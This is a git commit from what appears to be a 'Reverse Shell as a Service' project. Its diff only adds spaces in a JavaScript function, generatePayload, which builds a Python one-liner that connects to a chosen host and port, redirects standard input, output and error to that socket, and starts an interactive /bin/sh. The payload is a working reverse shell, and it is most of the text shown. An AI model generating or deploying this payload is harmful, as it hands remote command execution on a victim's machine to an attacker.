202eb90806089219cad2513a869059e8a60cc909
Luke Childs <lukechilds123@gmail.com>
2017-09-13 16:53:16 +0100

    Add spaces after semicolons in python source

--- src/index.js
+++ src/index.js
@@ -11,7 +11,7 @@ const usage = `# Reverse Shell as a Service
 #
 # 3. Don't be a dick`;
 
-const generatePayload = (hostname, port) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${hostname}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
+const generatePayload = (hostname, port) => `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${hostname}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`;
 
 const reverseShell = req => {
 	const [, hostname, port] = req.url.split('/');
